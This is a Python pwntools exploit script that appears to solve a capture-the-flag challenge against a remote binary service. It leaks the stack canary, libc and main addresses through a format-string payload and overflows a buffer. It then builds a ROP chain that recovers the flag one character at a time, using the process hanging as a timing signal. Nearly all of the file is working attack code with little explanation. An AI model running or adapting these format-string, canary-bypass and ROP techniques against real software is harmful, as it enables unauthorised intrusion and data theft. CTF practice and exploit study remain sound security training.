#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 152.96.15.7 --port 1337 --libc ./libc.so.6 ./pwn
from pwn import *
import time
import string

context.log_level = 'warning'

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './pwn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '152.96.15.2'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    r = remote(host, port)
    if args.GDB:
        gdb.attach(r, gdbscript=gdbscript)
    return r

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *main+970
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

flag = ""
charset = "HV23{}_!?" + string.ascii_letters + string.digits

for i in range(100):
    for guess in charset:
        r = start()

        # Get leaks (cookie,libc,main)
        #b"%43$llx|%45$llx|%55$llx|%68$llx|%77$llx"
        cookie = b"%43$p|%45$p|%47$p"
        r.sendlineafter(b"?", cookie)
        r.recvuntil(b"of ")
        cookie, libc_leak, main_leak = [int(i, 16) for i in r.recvuntil(b"\n").split(b"|")]
        #print(f' [+] Cookie: {hex(cookie)}')
        #print(f' [+] __libc_start_main: {hex(libc_leak)}')
        #print(f' [+] main: {hex(main_leak)}')

        # Skip 4 unneeded wishes
        for j in range(4):
            r.sendlineafter(b'wish: ', b"")

        # Wish 5 we wish for a buffer overflow
        payload = b"A" * 264
        payload += p64(cookie)

        # Find base and flag
        libc_base = libc_leak - 0x29d90 # libc base offset
        main_base = main_leak - 0x1329  # main base offset
        flag_addr = 0x6b8b4567500 + i   # Address where the flag is in memory

        #print(f' [+] LIBC Base: {hex(libc_base)}')
        #print(f' [+] Main Base: {hex(main_base)}')
        #print(f' [+] Flag: {hex(flag_addr)}')

        # Craft the ROP chain (dump flag 1 char at a time via exit code)
        pop_rax     = libc_base + 0x0000000000045eb0 # pop rax ; ret
        pop_rcx     = libc_base + 0x000000000003d1ee # pop rcx ; ret
        mov_mem_eax = libc_base + 0x000000000008d960 # movzx eax, byte ptr [rax] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
        mov_edx_eax = libc_base + 0x00000000000b5653 # mov edx, eax ; shr rax, 0x20 ; or eax, edx ; ret
        cmp_ecx_edx = libc_base + 0x00000000000b1280 # cmp ecx, edx ; jne 0xb1270 ; ret
        exitint     = libc_base + 0x0000000000125815 # mov edi, eax ; mov eax, 0x3c ; syscall
        loop        = main_base + 0x00000000000012cb # test RAX,RAX je to ret, else jmp RAX 

        payload += p64(exitint)
        rop_chain = [
            pop_rax, flag_addr,                # Pop flag addr into rax
            mov_mem_eax, exitint-8, exitint-8, # copies a byte from mem (flag), pop, pop
            mov_edx_eax, mov_edx_eax,          # move byte to edx
            pop_rcx, ord(guess),               # put guess in ecx
            cmp_ecx_edx,                       # compare guess to flag (if they match do endless loop)
            pop_rax, loop,                     # put endless loop addr in RAX
            loop,                              # call endless loop
            exitint                            # move flag bit to exit status, call exit
        ]
        payload += b''.join(p64(addr) for addr in rop_chain)

        # Send the payload to the target
        r.sendline(payload)

        # If it hangs we found the matching char
        st = time.time()
        r.recvall(timeout=2)
        et = time.time()
        if (et - st) >= 1:
            flag += guess
            print(f"[+] Found char: {guess}")
            break
        r.close()
    print(f"[+] Current flag is: {flag}")
        
print(f"[!] Final Flag: {flag}")